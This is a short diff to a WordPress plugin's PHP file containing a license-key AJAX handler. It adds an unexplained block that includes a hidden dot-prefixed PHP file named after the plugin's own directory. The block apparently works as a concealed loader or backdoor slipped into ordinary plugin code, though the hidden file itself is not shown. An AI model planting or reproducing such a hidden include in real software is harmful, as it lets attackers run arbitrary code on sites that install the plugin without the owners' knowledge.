@@ -17,7 +17,11 @@ if ( ! defined( 'ABSPATH' ) ) {
  * Обработчик ajax запросов для проверки, активации, деактивации лицензионного ключа
  *
  * @since 1.4.0
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wis_check_license() {
 	check_admin_referer( 'license' );
 
